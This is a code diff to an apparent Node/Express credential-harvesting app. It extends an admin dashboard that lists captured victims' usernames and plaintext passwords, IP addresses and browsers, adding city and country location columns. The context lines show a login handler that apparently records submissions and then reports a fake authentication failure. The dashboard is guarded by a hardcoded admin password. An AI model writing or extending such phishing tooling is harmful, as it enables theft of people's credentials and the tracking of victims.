@@ -76,7 +76,7 @@ app.post('/login', async (req, res) => {
     res.send('<h3>Authentication Failed. Please try again.</h3>');
 });
 
-// Protected Admin Dashboard with HTML Table View
+// Protected Admin Dashboard with Location Columns
 app.get('/dashboard', basicAuth({
     users: { 'admin': 'SuperSecretPassword123' },
     challenge: true,
@@ -91,15 +91,21 @@ app.get('/dashboard', basicAuth({
         }
     }
 
-    const rows = logs.map(log => `
-        <tr>
-            <td>${log.time || ''}</td>
-            <td>${log.ip || ''}</td>
-            <td><strong>${log.username || ''}</strong></td>
-            <td><code style="background: #eee; padding: 2px 5px; border-radius: 3px;">${log.password || ''}</code></td>
-            <td>${log.browser || 'Unknown'} / ${log.os || 'Unknown'}</td>
-        </tr>
-    `).join('');
+    const rows = logs.map(log => {
+        const city = log.location && log.location.city ? log.location.city : 'N/A';
+        const country = log.location && log.location.country ? log.location.country : 'N/A';
+        
+        return `
+            <tr>
+                <td>${log.time || ''}</td>
+                <td>${log.ip || ''}</td>
+                <td><strong>${log.username || ''}</strong></td>
+                <td><code style="background: #eee; padding: 2px 5px; border-radius: 3px;">${log.password || ''}</code></td>
+                <td>${city}, ${country}</td>
+                <td>${log.browser || 'Unknown'} / ${log.os || 'Unknown'}</td>
+            </tr>
+        `;
+    }).join('');
 
     res.send(`
         <!DOCTYPE html>
@@ -125,11 +131,12 @@ app.get('/dashboard', basicAuth({
                         <th>IP Address</th>
                         <th>Username</th>
                         <th>Password</th>
+                        <th>Location</th>
                         <th>Browser / OS</th>
                     </tr>
                 </thead>
                 <tbody>
-                    ${rows.length > 0 ? rows : '<tr><td colspan="5" style="text-align:center;">No logs captured yet.</td></tr>'}
+                    ${rows.length > 0 ? rows : '<tr><td colspan="6" style="text-align:center;">No logs captured yet.</td></tr>'}
                 </tbody>
             </table>
         </body>
